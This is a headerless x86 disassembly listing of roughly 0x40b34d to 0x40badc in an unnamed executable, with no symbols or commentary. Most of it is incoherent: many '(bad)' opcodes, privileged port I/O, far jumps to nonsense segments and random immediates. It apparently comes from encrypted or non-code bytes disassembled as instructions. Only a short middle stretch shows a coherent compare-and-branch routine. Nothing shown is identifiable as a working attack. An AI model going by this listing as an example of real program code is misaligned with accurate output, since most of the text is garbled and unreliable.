  40b34d:	push   ds
  40b34e:	jno    0x40b31e
  40b350:	in     al,dx
  40b351:	jp     0x40b2da
  40b353:	mov    ds:0x2442819d,eax
  40b358:	lods   eax,DWORD PTR ds:[esi]
  40b359:	into   
  40b35a:	popa   
  40b35b:	in     al,dx
  40b35c:	inc    ebp
  40b35d:	mov    ebx,DWORD PTR [edx-0x56]
  40b360:	mov    DWORD PTR [ebx-0x54],esp
  40b363:	push   edi
  40b364:	fst    DWORD PTR [edi]
  40b366:	and    eax,0xbbe198ed
  40b36b:	xlat   BYTE PTR ds:[ebx]
  40b36c:	jb     0x40b3c9
  40b36e:	enter  0x531,0xe5
  40b372:	xor    esp,DWORD PTR [esi+0x25d60f44]
  40b378:	repnz repnz sbb al,BYTE PTR [ebp-0x28a74d1]
  40b380:	retf   0xb4d0
  40b383:	mov    ds:0xb2036c3c,eax
  40b388:	scas   al,BYTE PTR es:[edi]
  40b389:	les    ebp,FWORD PTR ds:0xb0be0198
  40b38f:	into   
  40b390:	fisub  DWORD PTR [eax+0x40]
  40b393:	fldcw  WORD PTR [esi]
  40b395:	arpl   WORD PTR [edx-0x4d],ax
  40b398:	and    DWORD PTR [eax],edi
  40b39a:	popf   
  40b39b:	jecxz  0x40b36e
  40b39d:	cmp    al,0x23
  40b39f:	repz gs sbb ecx,eax
  40b3a3:	xchg   edi,eax
  40b3a4:	rcr    DWORD PTR [esi+0x4b664218],0xc5
  40b3ab:	sbb    DWORD PTR ds:0x140f6794,esi
  40b3b1:	jmp    0xcc4f:0xc7746072
  40b3b8:	dec    DWORD PTR [ebp-0x34]
  40b3bb:	out    dx,eax
  40b3bc:	pop    esp
  40b3bd:	dec    ebp
  40b3be:	iret   
  40b3bf:	mov    ebp,0x9fe3b2ad
  40b3c4:	pop    eax
  40b3c5:	xor    eax,0x97fa23fe
  40b3ca:	xor    eax,0x6d1afa6
  40b3cf:	retf   0x52da
  40b3d2:	fdivr  st,st(3)
  40b3d4:	mov    ds:0xfdb3169,al
  40b3d9:	xchg   esp,eax
  40b3da:	jo     0x40b3ef
  40b3dc:	jmp    0x5c6:0xb8303410
  40b3e3:	jne    0x40b370
  40b3e5:	inc    esi
  40b3e6:	(bad)  
  40b3e8:	rcr    ebp,1
  40b3ea:	mov    ds,WORD PTR [ebx]
  40b3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ed:	stos   DWORD PTR es:[edi],eax
  40b3ee:	xchg   ebp,eax
  40b3ef:	or     ch,BYTE PTR [edx+0x31]
  40b3f2:	lods   eax,DWORD PTR ds:[esi]
  40b3f3:	ss mov dl,0x22
  40b3f6:	add    edx,DWORD PTR [esi-0x3b132ef3]
  40b3fc:	sub    dh,BYTE PTR [esi-0x44]
  40b3ff:	push   esp
  40b400:	imul   ebp,DWORD PTR [ebx],0xffffffdf
  40b403:	cmp    ebx,edx
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x65
  40b425:	fwait
  40b426:	dec    ebx
  40b427:	cmc    
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b45d
  40b431:	in     al,dx
  40b432:	(bad)  
  40b433:	xor    eax,0x8c6f12a9
  40b438:	and    eax,DWORD PTR [edx-0x11]
  40b43b:	xor    BYTE PTR [edi-0x18e67690],dh
  40b441:	std    
  40b442:	in     al,dx
  40b443:	pop    ecx
  40b444:	gs scas eax,DWORD PTR es:[edi]
  40b446:	mov    edx,DWORD PTR ds:0x21df247c
  40b44c:	in     eax,dx
  40b44d:	popa   
  40b44e:	dec    esp
  40b44f:	mov    ch,0x74
  40b451:	fstp   TBYTE PTR [ebx+0x61be0da9]
  40b457:	xor    eax,0xb15c2626
  40b45c:	inc    ebx
  40b45d:	cmc    
  40b45e:	pushf  
  40b45f:	ins    BYTE PTR es:[edi],dx
  40b460:	jb     0x40b3e3
  40b462:	xchg   ecx,eax
  40b463:	mov    bl,0xe7
  40b465:	aas    
  40b466:	add    eax,0xa28a21dc
  40b46b:	je     0x40b3f1
  40b46d:	test   eax,0xb9f1e763
  40b472:	pop    ebx
  40b473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b474:	fmul   QWORD PTR ss:[ebp+0x63b30557]
  40b47b:	out    0xb5,eax
  40b47d:	pop    esi
  40b47e:	or     al,0x7d
  40b480:	imul   ecx,edx,0xffffffac
  40b483:	int3   
  40b484:	sahf   
  40b485:	scas   al,BYTE PTR es:[edi]
  40b486:	lahf   
  40b487:	setl   BYTE PTR [edi+0x23780262]
  40b48e:	daa    
  40b48f:	add    DWORD PTR [ecx+eax*1+0x1d703d4c],eax
  40b496:	mov    al,ds:0x58a30af7
  40b49b:	lahf   
  40b49c:	jp     0x40b470
  40b49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49f:	ss scas al,BYTE PTR es:[edi]
  40b4a1:	and    al,0x32
  40b4a3:	cli    
  40b4a4:	out    dx,eax
  40b4a5:	ret    0x593c
  40b4a8:	adc    ah,BYTE PTR [edx+0x1dfe0655]
  40b4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4af:	sub    DWORD PTR [esi+0x26ba8122],0x91a8215d
  40b4b9:	lock int3 
  40b4bb:	inc    esp
  40b4bc:	repnz xchg ebx,eax
  40b4be:	mov    ebx,0x73ac658e
  40b4c3:	or     dl,BYTE PTR [ebx+ecx*1]
  40b4c6:	push   esp
  40b4c7:	mov    eax,ds:0x77e267bd
  40b4cc:	loope  0x40b4a6
  40b4ce:	shr    ch,1
  40b4d0:	pop    ds
  40b4d1:	(bad)
  40b4d4:	jmp    FWORD PTR [esi+0x7a7e823c]
  40b4da:	daa    
  40b4db:	imul   edi,ecx,0xffffffad
  40b4de:	inc    ecx
  40b4df:	sub    eax,DWORD PTR [edi-0x691ee70b]
  40b4e5:	push   0x8f0ce653
  40b4ea:	jl     0x40b4a2
  40b4ec:	cld    
  40b4ed:	mov    ah,0x6f
  40b4ef:	into   
  40b4f0:	inc    ecx
  40b4f1:	clc    
  40b4f2:	push   esp
  40b4f3:	pusha  
  40b4f4:	jge    0x40b47f
  40b4f6:	(bad)  
  40b4f7:	cli    
  40b4f8:	dec    ebx
  40b4f9:	js     0x40b495
  40b4fb:	or     eax,0xe1d2d61a
  40b500:	aam    0x6a
  40b502:	hlt    
  40b503:	jg     0x40b584
  40b505:	js     0x40b4d9
  40b507:	cmp    esi,edx
  40b509:	retf   
  40b50a:	lahf   
  40b50b:	call   0xf83fe8c6
  40b510:	stos   DWORD PTR es:[edi],eax
  40b511:	pop    ds
  40b512:	sub    al,0x12
  40b514:	int    0xd4
  40b516:	xchg   DWORD PTR [ebx-0x30],ebp
  40b519:	push   0x5525bfa5
  40b51e:	lock push ss
  40b520:	stc    
  40b521:	fcmovu st,st(0)
  40b523:	mov    ebx,0xaa125c3a
  40b528:	icebp  
  40b529:	inc    esp
  40b52a:	das    
  40b52b:	dec    esp
  40b52c:	mov    eax,ds:0x427302a1
  40b531:	push   edi
  40b532:	loopne 0x40b577
  40b534:	mov    al,ds:0xa0d4f482
  40b539:	push   0x86b90989
  40b53e:	fstp   st(6)
  40b540:	pop    DWORD PTR [edx+0x2a753f63]
  40b546:	inc    ebx
  40b547:	sahf   
  40b548:	aaa    
  40b549:	add    eax,0xe2ca10c0
  40b54e:	(bad)  
  40b54f:	and    BYTE PTR [ecx+0x46],bl
  40b552:	mov    dl,dh
  40b554:	push   ebx
  40b555:	iret   
  40b556:	jno    0x40b5a1
  40b558:	jne    0x40b52f
  40b55a:	mov    edx,0xbaa51b3
  40b55f:	stos   DWORD PTR es:[edi],eax
  40b560:	jb     0x40b553
  40b562:	cmp    esi,eax
  40b564:	sahf   
  40b565:	and    dl,ah
  40b567:	shr    BYTE PTR [eax],cl
  40b569:	sbb    BYTE PTR [ebp+0x35],ch
  40b56c:	push   ebp
  40b56d:	test   eax,0x8a127132
  40b572:	push   esp
  40b573:	fld    QWORD PTR [eax-0x33]
  40b576:	sahf   
  40b577:	out    0xdf,eax
  40b579:	jecxz  0x40b59a
  40b57b:	xchg   DWORD PTR [ecx+esi*1],ebp
  40b57e:	fisttp WORD PTR [eax]
  40b580:	mov    dl,0x3c
  40b582:	add    eax,0x9a1fd37
  40b587:	xor    eax,0x8711d915
  40b58c:	xchg   ebx,eax
  40b58d:	aas    
  40b58e:	jle    0x40b57f
  40b590:	call   FWORD PTR [edx]
  40b592:	cmp    BYTE PTR [ebx+0x1f],ah
  40b595:	mov    al,ds:0x47e6ad92
  40b59a:	jg     0x40b59c
  40b59c:	inc    ebp
  40b59d:	dec    eax
  40b59e:	push   eax
  40b59f:	cmc    
  40b5a0:	or     eax,0xe9a0913c
  40b5a5:	scas   al,BYTE PTR es:[edi]
  40b5a6:	adc    al,0xe9
  40b5a8:	jb     0x40b57d
  40b5aa:	in     eax,dx
  40b5ab:	or     DWORD PTR [ecx-0x48263d34],0x22
  40b5b2:	fld    QWORD PTR [ecx-0x52]
  40b5b5:	mov    esp,0xe2a75e8d
  40b5ba:	sub    DWORD PTR [edx],edx
  40b5bc:	mov    ecx,0xfde20df9
  40b5c1:	js     0x40b5db
  40b5c3:	call   0x68c1d3a1
  40b5c8:	mov    esi,0x9ad9ae93
  40b5cd:	jmp    0x40b563
  40b5cf:	inc    esi
  40b5d0:	add    BYTE PTR [ebx+0x78],cl
  40b5d3:	ficomp DWORD PTR ds:0xbc0c7c41
  40b5d9:	js     0x40b5f5
  40b5db:	out    0xc5,al
  40b5dd:	mov    ebx,0xf01e3cdd
  40b5e2:	and    BYTE PTR [edx-0x364e0834],ch
  40b5e8:	xchg   esp,eax
  40b5e9:	mov    ebx,0x89662239
  40b5ee:	inc    esp
  40b5ef:	pop    esp
  40b5f0:	call   0x1570e48a
  40b5f5:	dec    edi
  40b5f6:	xchg   BYTE PTR [eax+0x2cb7a9b6],dl
  40b5fc:	shl    BYTE PTR [eax],1
  40b5fe:	fbstp  TBYTE PTR [ebx+0x7c4e0e5f]
  40b604:	jmp    0xf481:0xc29b77ae
  40b60b:	jb     0x40b5d0
  40b60d:	push   esp
  40b60e:	lds    ebp,FWORD PTR [esi+0x1858af95]
  40b614:	gs ins BYTE PTR es:[edi],dx
  40b616:	hlt    
  40b617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b618:	pop    esi
  40b619:	aam    0xda
  40b61b:	out    0x8a,eax
  40b61d:	cmp    BYTE PTR [eax+0x36],bh
  40b620:	xor    dh,BYTE PTR [ebp-0x37]
  40b623:	inc    esp
  40b624:	aad    0xac
  40b626:	inc    esi
  40b627:	and    dl,BYTE PTR [edi+edx*4]
  40b62a:	cmp    BYTE PTR [ecx-0x3f1748d5],al
  40b630:	not    bh
  40b632:	add    DWORD PTR [ecx-0x786c2bca],ecx
  40b638:	add    al,0xe0
  40b63a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b63b:	lahf   
  40b63c:	ins    DWORD PTR es:[edi],dx
  40b63d:	inc    esi
  40b63e:	adc    al,0x8a
  40b640:	add    cl,ah
  40b642:	in     al,dx
  40b643:	mov    dh,BYTE PTR [ebx-0x4cf3572d]
  40b649:	stos   BYTE PTR es:[edi],al
  40b64a:	outs   dx,BYTE PTR ds:[esi]
  40b64b:	dec    ebx
  40b64c:	cs pop edi
  40b64e:	xlat   BYTE PTR ds:[ebx]
  40b64f:	push   ebp
  40b650:	scas   eax,DWORD PTR es:[edi]
  40b651:	cld    
  40b652:	push   esi
  40b653:	rol    edx,1
  40b655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b656:	add    bh,ch
  40b658:	xchg   edi,eax
  40b659:	xor    dl,BYTE PTR [edi-0xe48c5f0]
  40b65f:	out    0x70,eax
  40b661:	imul   ebp,DWORD PTR [ebx+eax*1],0x4fdfe856
  40b668:	push   esp
  40b669:	push   ecx
  40b66a:	pop    es
  40b66b:	xchg   BYTE PTR [eax],dl
  40b66d:	in     eax,dx
  40b66e:	adc    edx,DWORD PTR [eax]
  40b670:	icebp  
  40b671:	retf   0xabf6
  40b674:	fcmovbe st,st(5)
  40b676:	rcl    BYTE PTR [eax+0x77afa699],0xd4
  40b67d:	retf   
  40b67e:	or     bl,bh
  40b680:	jl     0x40b6fc
  40b682:	icebp  
  40b683:	push   DWORD PTR [ebp-0x485c5874]
  40b689:	mov    cl,0x2a
  40b68b:	pop    edi
  40b68c:	mov    al,ds:0x8ab5a964
  40b691:	xchg   edi,eax
  40b692:	adc    al,0x24
  40b694:	xchg   esi,eax
  40b695:	dec    edi
  40b696:	aam    0xf3
  40b698:	push   ecx
  40b699:	pop    esi
  40b69a:	xchg   ebp,eax
  40b69b:	jle    0x40b699
  40b69d:	and    al,0xe3
  40b69f:	sub    al,0xde
  40b6a1:	arpl   ax,sp
  40b6a3:	and    al,BYTE PTR [eax+eax*1+0x1847a4c1]
  40b6aa:	xor    cl,bl
  40b6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ad:	push   es
  40b6ae:	pop    ss
  40b6af:	pop    ebp
  40b6b0:	mov    ah,ch
  40b6b2:	enter  0xbf4c,0x5f
  40b6b6:	push   DWORD PTR [edi+0x6c3b8dd8]
  40b6bc:	pop    esi
  40b6bd:	inc    ebp
  40b6be:	es scas eax,DWORD PTR es:[edi]
  40b6c0:	xchg   ebp,eax
  40b6c1:	mov    dl,0x36
  40b6c3:	cmp    BYTE PTR [esi+esi*4-0x6c8cbad8],cl
  40b6ca:	inc    ebx
  40b6cb:	inc    edi
  40b6cc:	out    0xf6,al
  40b6ce:	cld    
  40b6cf:	fnstsw WORD PTR [eax]
  40b6d1:	jb     0x40b676
  40b6d3:	sar    dh,0x82
  40b6d6:	sub    al,0x40
  40b6d8:	rcr    BYTE PTR [ebp+0x21babe6c],0x56
  40b6df:	pop    edx
  40b6e0:	jecxz  0x40b70c
  40b6e2:	and    BYTE PTR [edx],ch
  40b6e4:	pop    ds
  40b6e5:	cli    
  40b6e6:	mov    eax,0x13133ba1
  40b6eb:	repnz frstor [eax*8+0x3d52d019]
  40b6f3:	aaa    
  40b6f4:	pop    ss
  40b6f5:	retf   
  40b6f6:	sub    eax,0x4df6bb76
  40b6fb:	out    0x86,eax
  40b6fd:	add    edi,ebp
  40b6ff:	mov    bh,0x94
  40b701:	lahf   
  40b702:	mov    dl,0x90
  40b704:	mov    bl,0x2b
  40b706:	cmp    al,0xeb
  40b708:	inc    edi
  40b709:	dec    ebp
  40b70a:	ja     0x40b6db
  40b70c:	sbb    DWORD PTR [edi+0x435337ca],eax
  40b712:	(bad)  
  40b714:	and    ebp,ebp
  40b716:	aaa    
  40b717:	das    
  40b718:	popf   
  40b719:	jecxz  0x40b78b
  40b71b:	push   0x6be252f3
  40b720:	pop    ecx
  40b721:	pop    esi
  40b722:	sbb    esp,DWORD PTR [ebp+ecx*2+0x17]
  40b726:	call   0x17dc:0x5b75969c
  40b72d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b72e:	daa    
  40b72f:	and    ah,bh
  40b731:	mov    al,ds:0x3a87c466
  40b736:	or     BYTE PTR [edi],ah
  40b738:	pop    eax
  40b739:	or     BYTE PTR [ecx+edi*8],0x2d
  40b73d:	jmp    0x40b716
  40b73f:	fldz   
  40b741:	cmp    esp,DWORD PTR [esi]
  40b743:	and    al,BYTE PTR es:[ebx+0x15]
  40b747:	pusha  
  40b748:	aam    0xb9
  40b74a:	aad    0xb7
  40b74c:	adc    ch,BYTE PTR [eax-0x4d]
  40b74f:	(bad)  [esi]
  40b751:	mov    ds:0x5c41a7a6,eax
  40b756:	jmp    0x276b:0x38f3669f
  40b75d:	cmp    eax,0xef8f5893
  40b762:	pop    esi
  40b763:	cdq    
  40b764:	gs dec esp
  40b766:	jecxz  0x40b72b
  40b768:	hlt    
  40b769:	pop    ebx
  40b76a:	addr16 cli 
  40b76c:	push   esi
  40b76d:	push   ebp
  40b76e:	ins    DWORD PTR es:[edi],dx
  40b76f:	addr16 jp 0x40b7d5
  40b772:	jecxz  0x40b798
  40b774:	mov    eax,0xdf49c3eb
  40b779:	and    al,0x38
  40b77b:	push   esi
  40b77c:	add    esi,esp
  40b77e:	add    eax,0xbae409ce
  40b783:	arpl   WORD PTR [ecx*8+0x4aade3cd],si
  40b78a:	loope  0x40b7bb
  40b78c:	push   ds
  40b78d:	sti    
  40b78e:	ins    DWORD PTR es:[edi],dx
  40b78f:	jge    0x40b770
  40b791:	ficomp WORD PTR fs:[eax-0x71]
  40b795:	fmul   DWORD PTR [eax+0x8]
  40b798:	icebp  
  40b799:	mov    DWORD PTR [ebx+0x3fe72a0e],0xef6529ed
  40b7a3:	mov    edx,0x63b7a788
  40b7a8:	popf   
  40b7a9:	mov    eax,ds:0x121754ba
  40b7ae:	mov    dl,0xd3
  40b7b0:	sbb    bh,BYTE PTR [ebp+0x43]
  40b7b3:	or     BYTE PTR [ebx+edi*4+0x67],bh
  40b7b7:	cli    
  40b7b8:	icebp  
  40b7b9:	and    al,0x9c
  40b7bb:	jnp    0x40b7de
  40b7bd:	or     al,0xb9
  40b7bf:	or     esp,DWORD PTR [ebx+ebx*4-0x26]
  40b7c3:	push   0x697e3c6b
  40b7c8:	loopne 0x40b818
  40b7ca:	and    eax,0x6ef9935f
  40b7cf:	ret    
  40b7d0:	repz or DWORD PTR [esi+0x3a3e5837],ecx
  40b7d7:	jp     0x40b84e
  40b7d9:	pop    ebp
  40b7da:	adc    ecx,DWORD PTR [eax-0x3b43ff7a]
  40b7e0:	sbb    al,0x87
  40b7e2:	mov    edx,0xb6b9111e
  40b7e7:	jecxz  0x40b7bb
  40b7e9:	mov    al,ds:0x1a42fb13
  40b7ee:	lea    edi,[ebx+0x2aa15422]
  40b7f4:	and    dl,dl
  40b7f6:	adc    al,0x90
  40b7f8:	xor    DWORD PTR [esi],edx
  40b7fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7fb:	dec    eax
  40b7fc:	lods   al,BYTE PTR ds:[esi]
  40b7fd:	ret    0x10ef
  40b800:	mov    edi,0x9750eaae
  40b805:	in     eax,0x5c
  40b807:	in     al,dx
  40b808:	retf   0x997
  40b80b:	pop    ebx
  40b80c:	cmp    ebx,DWORD PTR [edi]
  40b80e:	mov    ds:0x394090c1,al
  40b813:	sar    esp,0xb8
  40b816:	add    esi,ebx
  40b818:	imul   edx,edx,0xb41298c6
  40b81e:	inc    edx
  40b81f:	mov    cl,0x70
  40b821:	xor    ebp,esp
  40b823:	jmp    0xc2dbac65
  40b828:	iret   
  40b829:	cmp    DWORD PTR [ebx+0x7d8bcc55],ecx
  40b82f:	cld    
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	jp     0x40b903
  40b8a6:	xor    DWORD PTR [eax-0x1e],eax
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b90d
  40b8b1:	cmp    bl,0x2e
  40b8b4:	sar    DWORD PTR [eax-0x226d330f],cl
  40b8ba:	aam    0x2
  40b8bc:	jnp    0x40b892
  40b8be:	sti    
  40b8bf:	das    
  40b8c0:	and    ah,BYTE PTR [edi+eiz*2]
  40b8c3:	stc    
  40b8c4:	xor    al,0x7e
  40b8c6:	push   ss
  40b8c7:	jp     0x40b85c
  40b8c9:	jae    0x40b8a9
  40b8cb:	and    eax,0x6bcc855e
  40b8d0:	repz dec edi
  40b8d2:	xchg   edi,eax
  40b8d3:	inc    ebx
  40b8d4:	sbb    al,0x9d
  40b8d6:	fdivp  st(1),st
  40b8d8:	cmp    al,BYTE PTR [ecx-0x49274dc7]
  40b8de:	ret    0x40d0
  40b8e1:	adc    cl,BYTE PTR [edi-0x2e7496c6]
  40b8e7:	ret    0xadcc
  40b8ea:	stos   DWORD PTR es:[edi],eax
  40b8eb:	lahf   
  40b8ec:	jo     0x40b8c2
  40b8ee:	mov    WORD PTR [ebx],gs
  40b8f0:	jo     0x40b951
  40b8f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f3:	daa    
  40b8f4:	inc    esi
  40b8f5:	ret    0x4f64
  40b8f8:	or     al,0xf9
  40b8fa:	add    al,0xb5
  40b8fc:	jg     0x40b973
  40b8fe:	test   al,0x16
  40b900:	mov    WORD PTR [ebx],?
  40b902:	pop    es
  40b903:	mov    BYTE PTR [esi],cl
  40b905:	xor    ebx,ecx
  40b907:	mov    bl,0xeb
  40b909:	xor    ebp,DWORD PTR [eax-0x3a]
  40b90c:	inc    edi
  40b90d:	stos   DWORD PTR es:[edi],eax
  40b90e:	fld    TBYTE PTR [edi+0x64ae6735]
  40b914:	and    DWORD PTR [eax],ebx
  40b916:	sub    al,0xac
  40b918:	call   0x6ac5:0xa8c2fb03
  40b91f:	mov    esi,0xe7c9808a
  40b924:	fild   DWORD PTR [esi+0xe]
  40b927:	jnp    0x40b99a
  40b929:	inc    eax
  40b92a:	ins    DWORD PTR es:[edi],dx
  40b92b:	jnp    0x40b8db
  40b92d:	stos   BYTE PTR es:[edi],al
  40b92e:	add    cl,ah
  40b930:	add    BYTE PTR [esi-0x2e],cl
  40b933:	dec    esp
  40b934:	mov    cl,BYTE PTR [edi+ecx*2+0x4e]
  40b938:	mov    ecx,0xc6086370
  40b93d:	sbb    cl,BYTE PTR ds:0xfa517ca5
  40b943:	fsubr  DWORD PTR [ebp+0x60]
  40b946:	in     al,dx
  40b947:	rcr    DWORD PTR gs:[edx],cl
  40b94a:	mov    edx,0x68467eac
  40b94f:	mov    eax,0xe8e3aade
  40b954:	and    al,0x48
  40b956:	xor    DWORD PTR [ebp-0x2a415337],eax
  40b95c:	cld    
  40b95d:	retf   
  40b95e:	mov    dh,dl
  40b960:	cmp    BYTE PTR [ecx+0x31],bh
  40b963:	stos   BYTE PTR es:[edi],al
  40b964:	adc    eax,0xdb2aa2e7
  40b969:	or     dh,BYTE PTR [ebx+0x30]
  40b96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96d:	repnz ins BYTE PTR es:[edi],dx
  40b96f:	sbb    DWORD PTR [ebp-0x51],edi
  40b972:	xchg   BYTE PTR [edx],bl
  40b974:	push   ebp
  40b975:	clc    
  40b976:	inc    ecx
  40b977:	and    cl,BYTE PTR [ebx]
  40b979:	imul   ebp,DWORD PTR [eax+ebp*4+0x65],0x79b46e7d
  40b981:	cs outs dx,DWORD PTR cs:[esi]
  40b984:	in     al,0xf6
  40b986:	ret    0x63df
  40b989:	scas   al,BYTE PTR es:[edi]
  40b98a:	cmc    
  40b98b:	xchg   esi,eax
  40b98c:	sbb    eax,0x6ac844c2
  40b991:	ret    
  40b992:	daa    
  40b993:	jecxz  0x40b98c
  40b995:	and    al,0x6c
  40b997:	dec    edi
  40b998:	in     al,0x41
  40b99a:	mov    bl,0x37
  40b99c:	and    cl,dh
  40b99e:	and    DWORD PTR [ecx-0x7547c1be],esi
  40b9a4:	out    0x96,eax
  40b9a6:	(bad)  
  40b9a7:	fsin   
  40b9a9:	mov    ch,0x35
  40b9ab:	sbb    al,ch
  40b9ad:	loope  0x40b969
  40b9af:	jne    0x40ba0b
  40b9b1:	mov    bl,0x8
  40b9b3:	push   ss
  40b9b4:	rcl    BYTE PTR [edx],0x75
  40b9b7:	cmp    edx,DWORD PTR cs:[edi-0x1c]
  40b9bb:	mov    ds:0x746b3a50,eax
  40b9c0:	add    al,0xa1
  40b9c2:	js     0x40b960
  40b9c4:	outs   dx,BYTE PTR ds:[esi]
  40b9c5:	(bad)  
  40b9c7:	add    eax,DWORD PTR [esp+edi*2+0x5a]
  40b9cb:	pop    ds
  40b9cc:	fs push ss
  40b9ce:	adc    esp,DWORD PTR [edx+0x69]
  40b9d1:	push   0xc73868e4
  40b9d6:	leave  
  40b9d7:	xchg   edx,eax
  40b9d8:	xor    eax,0x99c54eed
  40b9dd:	push   eax
  40b9de:	out    dx,al
  40b9df:	sahf   
  40b9e0:	push   ebp
  40b9e1:	test   DWORD PTR [esi],edx
  40b9e3:	or     DWORD PTR [edx],0x44
  40b9e6:	pop    eax
  40b9e7:	aas    
  40b9e8:	add    eax,0x9408f734
  40b9ed:	mov    ecx,0xf1add89c
  40b9f2:	shl    BYTE PTR [eax+edi*1-0x1e9519c2],0xd2
  40b9fa:	add    BYTE PTR [esi+0x6370b315],ah
  40ba00:	cmp    BYTE PTR [ebx],0x16
  40ba03:	mov    bl,0xde
  40ba05:	push   es
  40ba06:	ss pop ebp
  40ba08:	call   0x7558:0x90e0d8c5
  40ba0f:	jle    0x40b9d1
  40ba11:	test   al,0x33
  40ba13:	cwde   
  40ba14:	aam    0xe6
  40ba16:	scas   eax,DWORD PTR es:[edi]
  40ba17:	mul    DWORD PTR [eax]
  40ba19:	push   ss
  40ba1a:	mov    esp,0xf5c3cb26
  40ba1f:	xchg   esi,eax
  40ba20:	mov    cl,0xd7
  40ba22:	xchg   edx,eax
  40ba23:	pop    eax
  40ba24:	dec    ebx
  40ba25:	int    0x51
  40ba27:	sub    DWORD PTR [ecx],edx
  40ba29:	jecxz  0x40ba8c
  40ba2b:	jb     0x40b9d8
  40ba2d:	lock mov ss,esi
  40ba30:	pop    ebp
  40ba31:	pop    es
  40ba32:	fwait
  40ba33:	mov    esp,0x931a7cd5
  40ba38:	lock loop 0x40ba5e
  40ba3b:	push   ebx
  40ba3c:	dec    edx
  40ba3d:	lea    ebx,[ebx]
  40ba3f:	je     0x40ba5e
  40ba41:	cs call 0x4bd6ca08
  40ba47:	(bad)  
  40ba48:	jne    0x40ba50
  40ba4a:	hlt    
  40ba4b:	outs   dx,BYTE PTR ds:[esi]
  40ba4c:	pop    esp
  40ba4d:	ja     0x40baa4
  40ba4f:	lock cdq 
  40ba51:	sub    bl,BYTE PTR [ebp-0x4f8e10eb]
  40ba57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba58:	and    eax,0xbedb62f0
  40ba5d:	fbld   TBYTE PTR [eax+ecx*2]
  40ba60:	shl    BYTE PTR [edi-0x38ad4e9d],0x8d
  40ba67:	add    DWORD PTR [ecx+0x49795d36],ebx
  40ba6d:	mov    ebx,0x3d57e22c
  40ba72:	adc    eax,0x7de58146
  40ba77:	out    0xda,al
  40ba79:	mov    edi,0x1dbc9d83
  40ba7e:	je     0x40ba32
  40ba80:	sar    BYTE PTR [edi],cl
  40ba82:	addr16 stc 
  40ba84:	mov    dh,0x45
  40ba86:	ja     0x40ba74
  40ba88:	imul   edi,DWORD PTR [ebp-0x28ba8638],0x57687d7d
  40ba92:	lahf   
  40ba93:	sar    BYTE PTR [ebp+0x6807ef72],1
  40ba99:	out    0x8b,eax
  40ba9b:	adc    eax,0x48364e54
  40baa0:	adc    ch,BYTE PTR [eax-0x210bbd00]
  40baa6:	pop    es
  40baa7:	retf   
  40baa8:	ret    
  40baa9:	out    dx,eax
  40baaa:	adc    DWORD PTR [esi+ecx*8],ebx
  40baad:	out    0xbe,eax
  40baaf:	adc    al,0xaa
  40bab1:	popa   
  40bab2:	add    al,0x5b
  40bab4:	cld    
  40bab5:	adc    dl,BYTE PTR [esi+0x89d4dd6]
  40babb:	retf   
  40babc:	js     0x40ba97
  40babe:	popa   
  40babf:	aas    
  40bac0:	xchg   edx,eax
  40bac1:	and    ah,BYTE PTR [ecx+0x76bc9aab]
  40bac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac8:	int3   
  40bac9:	lock sub BYTE PTR [esi+0x5d],dl
  40bacd:	mov    ebp,0x6cf9309f
  40bad2:	sti    
  40bad3:	jmp    0x6d9dbd1b
  40bad8:	shr    BYTE PTR [esp+edx*4],0x76
  40badc:	push   cs
